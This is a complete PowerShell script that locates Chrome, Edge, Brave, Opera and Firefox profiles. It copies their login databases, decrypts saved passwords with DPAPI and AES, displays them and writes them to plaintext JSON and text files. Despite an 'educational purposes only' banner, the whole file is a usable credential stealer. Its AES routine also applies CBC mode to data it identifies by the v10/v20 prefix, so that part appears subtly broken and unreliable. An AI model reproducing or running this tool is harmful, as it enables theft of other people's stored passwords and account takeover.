# BrowserPasswordExtractor.ps1

# Function to decrypt data using DPAPI
function Decrypt-DPAPI {
    param(
        [byte[]]$encryptedData
    )
    
    try {
        Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
using System.Text;

public class DPAPIHelper {
    [DllImport("crypt32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    private static extern bool CryptUnprotectData(
        ref DATA_BLOB pDataIn,
        string szDataDescr,
        ref DATA_BLOB pOptionalEntropy,
        IntPtr pvReserved,
        ref CRYPTPROTECT_PROMPTSTRUCT pPromptStruct,
        int dwFlags,
        ref DATA_BLOB pDataOut);

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    private struct DATA_BLOB {
        public int cbData;
        public IntPtr pbData;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    private struct CRYPTPROTECT_PROMPTSTRUCT {
        public int cbSize;
        public int dwPromptFlags;
        public IntPtr hwndApp;
        public string szPrompt;
    }

    public static byte[] Decrypt(byte[] encryptedData) {
        if (encryptedData == null || encryptedData.Length == 0)
            return null;

        DATA_BLOB dataIn = new DATA_BLOB();
        DATA_BLOB dataOut = new DATA_BLOB();
        CRYPTPROTECT_PROMPTSTRUCT prompt = new CRYPTPROTECT_PROMPTSTRUCT();
        DATA_BLOB entropy = new DATA_BLOB();

        try {
            dataIn.cbData = encryptedData.Length;
            dataIn.pbData = Marshal.AllocHGlobal(dataIn.cbData);
            Marshal.Copy(encryptedData, 0, dataIn.pbData, dataIn.cbData);

            prompt.cbSize = Marshal.SizeOf(typeof(CRYPTPROTECT_PROMPTSTRUCT));
            prompt.dwPromptFlags = 0;
            prompt.hwndApp = IntPtr.Zero;
            prompt.szPrompt = null;

            bool success = CryptUnprotectData(
                ref dataIn,
                null,
                ref entropy,
                IntPtr.Zero,
                ref prompt,
                0,
                ref dataOut);

            if (success) {
                byte[] decryptedBytes = new byte[dataOut.cbData];
                Marshal.Copy(dataOut.pbData, decryptedBytes, 0, dataOut.cbData);
                return decryptedBytes;
            }
            return null;
        }
        finally {
            if (dataIn.pbData != IntPtr.Zero)
                Marshal.FreeHGlobal(dataIn.pbData);
            if (dataOut.pbData != IntPtr.Zero)
                Marshal.FreeHGlobal(dataOut.pbData);
        }
    }
}
'@
        
        if ($encryptedData -eq $null -or $encryptedData.Length -eq 0) {
            return $null
        }
        
        $decrypted = [DPAPIHelper]::Decrypt($encryptedData)
        return $decrypted
        
    } catch {
        Write-Host "    ‚ùå DPAPI Decryption Error" -ForegroundColor Red
        return $null
    }
}

# Browser Password Extractor Class
class BrowserPasswordExtractor {
    # Browser definitions
    [hashtable]$Browsers = @{
        "Chrome"  = "GetChromePaths"
        "Edge"    = "GetEdgePaths"
        "Brave"   = "GetBravePaths"
        "Opera"   = "GetOperaPaths"
        "Firefox" = "GetFirefoxPaths"
    }
    
    # Constructor
    BrowserPasswordExtractor() {
        # Check if running as administrator
        $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
        if (-not $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
            Write-Host "‚ö†Ô∏è  Warning - Running without Administrator privileges" -ForegroundColor Yellow
            Write-Host "   Some browsers may not be accessible" -ForegroundColor Yellow
        }
    }
    
    # Get Chrome profile paths
    [array]GetChromePaths() {
        $basePath = Join-Path $env:USERPROFILE "AppData\Local\Google\Chrome\User Data"
        return $this.GetChromiumProfiles($basePath)
    }
    
    # Get Edge profile paths
    [array]GetEdgePaths() {
        $basePath = Join-Path $env:USERPROFILE "AppData\Local\Microsoft\Edge\User Data"
        return $this.GetChromiumProfiles($basePath)
    }
    
    # Get Brave browser profile paths
    [array]GetBravePaths() {
        $basePath = Join-Path $env:USERPROFILE "AppData\Local\BraveSoftware\Brave-Browser\User Data"
        return $this.GetChromiumProfiles($basePath)
    }
    
    # Get Opera profile paths
    [array]GetOperaPaths() {
        $basePath = Join-Path $env:USERPROFILE "AppData\Roaming\Opera Software\Opera Stable"
        $profiles = @()
        
        if (Test-Path $basePath) {
            $loginData = Join-Path $basePath "Login Data"
            if (Test-Path $loginData) {
                $profiles += ,@("Default", $basePath)
            }
        }
        return $profiles
    }
    
    # Get Firefox profile paths
    [array]GetFirefoxPaths() {
        $firefoxPath = Join-Path $env:USERPROFILE "AppData\Roaming\Mozilla\Firefox\Profiles"
        $profiles = @()
        
        if (Test-Path $firefoxPath) {
            $profileDirs = Get-ChildItem -Path $firefoxPath -Directory -Filter "*.default*" -ErrorAction SilentlyContinue
            foreach ($profileDir in $profileDirs) {
                $profiles += ,@($profileDir.Name, $profileDir.FullName)
            }
        }
        return $profiles
    }
    
    # Get profiles for Chromium-based browsers
    [array]GetChromiumProfiles([string]$basePath) {
        $profiles = @()
        
        if (Test-Path $basePath) {
            # Default profile
            $defaultProfile = Join-Path $basePath "Default"
            $defaultLoginData = Join-Path $defaultProfile "Login Data"
            if (Test-Path $defaultLoginData) {
                $profiles += ,@("Default", $defaultProfile)
            }
            
            # Other profiles
            $profileDirs = Get-ChildItem -Path $basePath -Directory -Filter "Profile *" -ErrorAction SilentlyContinue
            foreach ($profileDir in $profileDirs) {
                $loginData = Join-Path $profileDir.FullName "Login Data"
                if (Test-Path $loginData) {
                    $profiles += ,@($profileDir.Name, $profileDir.FullName)
                }
            }
        }
        return $profiles
    }
    
    # Get encryption key for Chromium-based browsers
    [byte[]]GetEncryptionKey([string]$browserPath) {
        $localStatePath = Join-Path $browserPath "Local State"
        
        try {
            if (-not (Test-Path $localStatePath)) {
                Write-Host "    ‚ùå Local State file not found" -ForegroundColor Red
                return $null
            }
            
            # Read and parse JSON
            $localStateContent = Get-Content $localStatePath -Raw -ErrorAction Stop
            $localStateJson = $localStateContent | ConvertFrom-Json -ErrorAction Stop
            
            # Get encrypted key
            $encryptedKeyBase64 = $localStateJson.os_crypt.encrypted_key
            
            if ([string]::IsNullOrEmpty($encryptedKeyBase64)) {
                Write-Host "    ‚ùå No encrypted key found" -ForegroundColor Red
                return $null
            }
            
            # Decode base64
            $encryptedKey = [System.Convert]::FromBase64String($encryptedKeyBase64)
            
            if ($encryptedKey.Length -le 5) {
                Write-Host "    ‚ùå Invalid encryption key length" -ForegroundColor Red
                return $null
            }
            
            # Remove DPAPI prefix (first 5 bytes - "DPAPI")
            $encryptedKey = $encryptedKey[5..($encryptedKey.Length - 1)]
            
            # Decrypt using DPAPI
            $decryptedKey = Decrypt-DPAPI -encryptedData $encryptedKey
            
            if ($decryptedKey) {
                return $decryptedKey
            } else {
                Write-Host "    ‚ùå Failed to decrypt encryption key" -ForegroundColor Red
                return $null
            }
            
        } catch {
            Write-Host "    ‚ùå Error getting encryption key" -ForegroundColor Red
            return $null
        }
    }
    
    # Decrypt Chromium password
    [string]DecryptChromiumPassword([byte[]]$encryptedPassword, [byte[]]$key) {
        try {
            if ($null -eq $encryptedPassword -or $encryptedPassword.Length -eq 0) {
                return ""
            }
            
            # First try DPAPI for older passwords
            try {
                $decrypted = Decrypt-DPAPI -encryptedData $encryptedPassword
                if ($decrypted) {
                    $password = [System.Text.Encoding]::UTF8.GetString($decrypted)
                    if (-not [string]::IsNullOrEmpty($password)) {
                        return $password
                    }
                }
            } catch {
                # Continue to AES decryption
            }
            
            # Try AES decryption for newer passwords
            if ($key -and $key.Length -ge 16 -and $encryptedPassword.Length -ge 15) {
                try {
                    # Check for v10/v20 prefix
                    if ($encryptedPassword[0] -eq 0x76 -and 
                        ($encryptedPassword[1] -eq 0x31 -or $encryptedPassword[1] -eq 0x32) -and 
                        $encryptedPassword[2] -eq 0x30) {
                        
                        # Extract IV (first 12 bytes after v10/v20)
                        $iv = $encryptedPassword[3..14]
                        
                        # Extract ciphertext (rest except last 16 bytes for tag)
                        $ciphertextLength = $encryptedPassword.Length - 15 - 16
                        if ($ciphertextLength -gt 0) {
                            $ciphertext = $encryptedPassword[15..(15 + $ciphertextLength - 1)]
                            
                            # Create AES decryptor
                            $aes = [System.Security.Cryptography.Aes]::Create()
                            $aes.Key = $key
                            $aes.IV = $iv
                            $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
                            $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
                            
                            $decryptor = $aes.CreateDecryptor()
                            $decryptedBytes = $decryptor.TransformFinalBlock($ciphertext, 0, $ciphertext.Length)
                            $result = [System.Text.Encoding]::UTF8.GetString($decryptedBytes).TrimEnd("`0")
                            return $result
                        }
                    }
                } catch {
                    # AES decryption failed
                }
            }
            
            return "[Decryption Failed]"
            
        } catch {
            return "[Error]"
        }
    }
    
    # Extract Firefox passwords (simplified)
    [array]DecryptFirefoxPassword([string]$profilePath) {
        $passwords = @()
        
        try {
            $signonsPath = Join-Path $profilePath "signons.sqlite"
            $loginsPath = Join-Path $profilePath "logins.json"
            
            # Check for new format first
            if (Test-Path $loginsPath) {
                try {
                    $loginsData = Get-Content $loginsPath -Raw -ErrorAction Stop | ConvertFrom-Json -ErrorAction Stop
                    
                    if ($loginsData.logins) {
                        foreach ($login in $loginsData.logins) {
                            $passwords += @{
                                url = if ($login.hostname) { $login.hostname } else { "[Unknown URL]" }
                                username = "[Firefox - Requires Master Password]"
                                password = "[Firefox - Requires Master Password]"
                            }
                        }
                    }
                } catch {
                    Write-Host "    ‚ö†Ô∏è  Could not read Firefox logins.json" -ForegroundColor Yellow
                }
            }
            # Check for old format
            elseif (Test-Path $signonsPath) {
                $passwords += @{
                    url = "Firefox Password Database"
                    username = "[Firefox - Old Format Detected]"
                    password = "[Requires Master Password/Key Files]"
                }
            }
            
        } catch {
            Write-Host "    ‚ö†Ô∏è  Firefox profile access error" -ForegroundColor Yellow
        }
        
        return $passwords
    }
    
    # Extract passwords from Chromium-based browsers
    [array]ExtractChromiumPasswords([string]$browserName, [string]$profileName, [string]$profilePath, [byte[]]$key) {
        $dbPath = Join-Path $profilePath "Login Data"
        
        if (-not (Test-Path $dbPath)) {
            return @()
        }
        
        $passwords = @()
        
        try {
            # Create temporary copy
            $tempDb = Join-Path $env:TEMP "temp_${browserName}_${profileName}.db"
            if (Test-Path $tempDb) {
                Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
            }
            
            Copy-Item $dbPath $tempDb -Force -ErrorAction Stop
            
            # Check if file was copied
            if (Test-Path $tempDb) {
                # Try to check if SQLite is available
                try {
                    # Check if we can load SQLite
                    $sqliteLoaded = $false
                    try {
                        Add-Type -Path "System.Data.SQLite.dll" -ErrorAction SilentlyContinue
                        $sqliteLoaded = $true
                    } catch {
                        try {
                            [void][System.Reflection.Assembly]::LoadWithPartialName("System.Data.SQLite")
                            $sqliteLoaded = $true
                        } catch {
                            $sqliteLoaded = $false
                        }
                    }
                    
                    if ($sqliteLoaded) {
                        # Use SQLite to read the database
                        $connectionString = "Data Source=$tempDb;Version=3;Read Only=True;"
                        $connection = New-Object System.Data.SQLite.SQLiteConnection($connectionString)
                        
                        try {
                            $connection.Open()
                            $command = $connection.CreateCommand()
                            $command.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
                            
                            $reader = $command.ExecuteReader()
                            
                            while ($reader.Read()) {
                                try {
                                    $url = if (-not $reader.IsDBNull(0)) { $reader.GetString(0) } else { "" }
                                    $username = if (-not $reader.IsDBNull(1)) { $reader.GetString(1) } else { "" }
                                    
                                    # Get password bytes
                                    $passwordBytes = @()
                                    if (-not $reader.IsDBNull(2)) {
                                        # Read as byte array
                                        $stream = $reader.GetStream(2)
                                        $memoryStream = New-Object System.IO.MemoryStream
                                        $stream.CopyTo($memoryStream)
                                        $passwordBytes = $memoryStream.ToArray()
                                        $memoryStream.Close()
                                        $stream.Close()
                                    }
                                    
                                    if ($passwordBytes -and $passwordBytes.Length -gt 0) {
                                        $password = $this.DecryptChromiumPassword($passwordBytes, $key)
                                        
                                        if (-not [string]::IsNullOrEmpty($username) -and -not [string]::IsNullOrEmpty($password) -and $password -ne "[Decryption Failed]") {
                                            $passwords += @{
                                                url = $url
                                                username = $username
                                                password = $password
                                            }
                                        }
                                    }
                                } catch {
                                    # Skip this entry if there's an error
                                }
                            }
                            
                            $reader.Close()
                        } finally {
                            $connection.Close()
                        }
                    } else {
                        # SQLite not available
                        Write-Host "      ‚ö†Ô∏è  SQLite library not installed" -ForegroundColor Yellow
                        Write-Host "      üí° Install with - Install-Package System.Data.SQLite" -ForegroundColor Cyan
                    }
                    
                } catch {
                    Write-Host "      ‚ö†Ô∏è  Database read error" -ForegroundColor Yellow
                }
                
                # Clean up temp file
                Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
            }
            
        } catch {
            Write-Host "    ‚ö†Ô∏è  Error accessing ${browserName} database" -ForegroundColor Yellow
        }
        
        return $passwords
    }
    
    # Scan all browsers
    [hashtable]ScanAllBrowsers() {
        Write-Host "`nüåê MULTI-BROWSER PASSWORD EXTRACTOR" -ForegroundColor Cyan
        Write-Host "===============================================================" -ForegroundColor Cyan
        Write-Host ""
        
        $allResults = @{}
        
        foreach ($browserName in $this.Browsers.Keys | Sort-Object) {
            Write-Host "üîç Scanning ${browserName}..." -ForegroundColor Yellow
            
            try {
                $profileMethod = $this.Browsers[$browserName]
                $profiles = $this.$profileMethod()
                
                if ($profiles.Count -eq 0) {
                    Write-Host "   üì≠ ${browserName} not found or no accessible profiles" -ForegroundColor Gray
                    Write-Host ""
                    continue
                }
                
                Write-Host "   ‚úÖ Found $($profiles.Count) profile(s)" -ForegroundColor Green
                
                $browserPasswords = @()
                
                foreach ($profile in $profiles) {
                    $profileName = $profile[0]
                    $profilePath = $profile[1]
                    
                    Write-Host "      üìÅ Profile - ${profileName}" -ForegroundColor White
                    
                    if ($browserName -eq "Firefox") {
                        $passwords = $this.DecryptFirefoxPassword($profilePath)
                    } else {
                        $browserDir = Split-Path $profilePath -Parent
                        $key = $this.GetEncryptionKey($browserDir)
                        
                        if ($key) {
                            $passwords = $this.ExtractChromiumPasswords($browserName, $profileName, $profilePath, $key)
                        } else {
                            $passwords = @()
                        }
                    }
                    
                    if ($passwords.Count -gt 0) {
                        Write-Host "         üîì Found $($passwords.Count) passwords" -ForegroundColor Green
                    } else {
                        Write-Host "         üîí No passwords found" -ForegroundColor Gray
                    }
                    
                    $browserPasswords += $passwords
                }
                
                if ($browserPasswords.Count -gt 0) {
                    $allResults[$browserName] = $browserPasswords
                    Write-Host "   üìä ${browserName} Total - $($browserPasswords.Count) passwords" -ForegroundColor Green
                } else {
                    Write-Host "   üìä ${browserName} - No passwords extracted" -ForegroundColor Gray
                }
                
            } catch {
                Write-Host "   ‚ùå Error scanning ${browserName}" -ForegroundColor Red
            }
            
            Write-Host ""
        }
        
        return $allResults
    }
    
    # Display results
    [void]DisplayResults([hashtable]$results) {
        Clear-Host
        
        Write-Host "`n" + ("=" * 80) -ForegroundColor Cyan
        Write-Host "üìã EXTRACTION RESULTS" -ForegroundColor Yellow
        Write-Host "=" * 80 -ForegroundColor Cyan
        Write-Host ""
        
        $totalPasswords = 0
        
        if ($results.Count -eq 0) {
            Write-Host "‚ùå No passwords were extracted from any browser" -ForegroundColor Red
            Write-Host ""
            Write-Host "Possible reasons" -ForegroundColor Yellow
            Write-Host "1. Browsers are running (close all browsers and try again)" -ForegroundColor White
            Write-Host "2. No saved passwords exist" -ForegroundColor White
            Write-Host "3. Permission issues (try running as Administrator)" -ForegroundColor White
            Write-Host "4. SQLite library not installed" -ForegroundColor White
            return
        }
        
        foreach ($browserName in ($results.Keys | Sort-Object)) {
            $passwords = $results[$browserName]
            
            if ($passwords.Count -gt 0) {
                Write-Host "üñ•Ô∏è  $($browserName.ToUpper()) - $($passwords.Count) Passwords" -ForegroundColor Green
                Write-Host ("‚îÄ" * 60) -ForegroundColor DarkGray
                
                $counter = 1
                foreach ($entry in $passwords) {
                    Write-Host "   $($counter.ToString().PadLeft(2))." -NoNewline -ForegroundColor White
                    Write-Host " üåê " -NoNewline -ForegroundColor Cyan
                    Write-Host $entry.url -ForegroundColor White
                    
                    if ($entry.username -ne "[Firefox - Requires Master Password]") {
                        Write-Host "        üë§ " -NoNewline -ForegroundColor Gray
                        Write-Host $entry.username -ForegroundColor White
                    } else {
                        Write-Host "        üë§ $($entry.username)" -ForegroundColor Yellow
                    }
                    
                    if ($entry.password -notmatch "^\[.*\]$") {
                        Write-Host "        üîë " -NoNewline -ForegroundColor Gray
                        Write-Host $entry.password -ForegroundColor Red
                    } else {
                        Write-Host "        üîë $($entry.password)" -ForegroundColor Yellow
                    }
                    
                    $counter++
                    if ($counter -gt 10) {
                        Write-Host "        ... and $($passwords.Count - 10) more entries" -ForegroundColor DarkGray
                        break
                    }
                }
                Write-Host ""
                $totalPasswords += $passwords.Count
            }
        }
        
        Write-Host "üìä SUMMARY" -ForegroundColor Cyan
        Write-Host ("‚îÄ" * 40) -ForegroundColor DarkGray
        Write-Host "Total Browsers Scanned - $($results.Count)" -ForegroundColor White
        Write-Host "Total Passwords Found - $totalPasswords" -ForegroundColor White
        Write-Host ""
        
        # Save to file
        $this.SaveToFile($results)
    }
    
    # Save results to file
    [void]SaveToFile([hashtable]$results) {
        try {
            $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
            $filename = "browser_passwords_${timestamp}.json"
            
            # Convert to serializable format
            $serializableResults = @{}
            foreach ($browser in $results.Keys) {
                $serializableResults[$browser] = $results[$browser]
            }
            
            # Save JSON
            $serializableResults | ConvertTo-Json -Depth 5 | Out-File -FilePath $filename -Encoding UTF8
            
            # Also save as text file
            $textFilename = "browser_passwords_${timestamp}.txt"
            $output = @()
            $output += "=" * 60
            $output += "BROWSER PASSWORDS EXTRACTION REPORT"
            $output += "Generated on - $(Get-Date)"
            $output += "=" * 60
            $output += ""
            
            foreach ($browserName in ($results.Keys | Sort-Object)) {
                $passwords = $results[$browserName]
                if ($passwords.Count -gt 0) {
                    $output += "$($browserName.ToUpper()) - $($passwords.Count) Passwords"
                    $output += ("-" * 50)
                    
                    $counter = 1
                    foreach ($entry in $passwords) {
                        $output += "$counter. URL - $($entry.url)"
                        $output += "   Username - $($entry.username)"
                        $output += "   Password - $($entry.password)"
                        $output += ""
                        $counter++
                    }
                }
            }
            
            $output | Out-File -FilePath $textFilename -Encoding UTF8
            
            Write-Host "üíæ Results saved to" -ForegroundColor Green
            Write-Host "   ‚Ä¢ $filename (JSON format)" -ForegroundColor White
            Write-Host "   ‚Ä¢ $textFilename (Text format)" -ForegroundColor White
            Write-Host ""
            
        } catch {
            Write-Host "‚ö†Ô∏è  Could not save results to file" -ForegroundColor Yellow
        }
    }
}

# Main execution function
function Main {
    # Clear screen and show banner
    Clear-Host
    
    Write-Host "===============================================================" -ForegroundColor Cyan
    Write-Host "       MULTI-BROWSER PASSWORD EXTRACTOR TOOL" -ForegroundColor Yellow
    Write-Host "===============================================================" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "‚ö†Ô∏è  IMPORTANT DISCLAIMER" -ForegroundColor Red
    Write-Host "   This tool is for educational purposes only." -ForegroundColor White
    Write-Host "   Use only on systems you own or have permission to test." -ForegroundColor White
    Write-Host ""
    Write-Host "üìã PREREQUISITES" -ForegroundColor Yellow
    Write-Host "   1. Close ALL browsers before running" -ForegroundColor White
    Write-Host "   2. Run as Administrator for best results" -ForegroundColor White
    Write-Host "   3. Install SQLite for full functionality" -ForegroundColor White
    Write-Host ""
    
    # Check for SQLite
    try {
        [void][System.Reflection.Assembly]::LoadWithPartialName("System.Data.SQLite")
        Write-Host "‚úÖ SQLite library detected" -ForegroundColor Green
    } catch {
        Write-Host "‚ö†Ô∏è  SQLite library not found" -ForegroundColor Yellow
        Write-Host "   For best results, install SQLite" -ForegroundColor Cyan
        Write-Host "   Download from - https://system.data.sqlite.org" -ForegroundColor Cyan
        Write-Host ""
    }
    
    # Confirmation
    Write-Host "Press ENTER to begin extraction..." -NoNewline -ForegroundColor White
    $null = Read-Host
    
    # Create extractor and scan
    try {
        $extractor = [BrowserPasswordExtractor]::new()
        $results = $extractor.ScanAllBrowsers()
        $extractor.DisplayResults($results)
    } catch {
        Write-Host "‚ùå FATAL ERROR" -ForegroundColor Red
        Write-Host "Error details - $_" -ForegroundColor Red
    }
    
    # Completion
    Write-Host ""
    Write-Host "‚úÖ Extraction process completed" -ForegroundColor Green
    Write-Host ""
    Write-Host "Press any key to exit..." -NoNewline -ForegroundColor Gray
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
}

# Entry point
try {
    # Set encoding for proper output
    [Console]::OutputEncoding = [System.Text.Encoding]::UTF8
    
    # Run main function
    Main
} catch {
    Write-Host "‚ùå Script execution failed" -ForegroundColor Red
    Write-Host "Error - $_" -ForegroundColor Red
    Write-Host "Press any key to exit..." -NoNewline
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
}
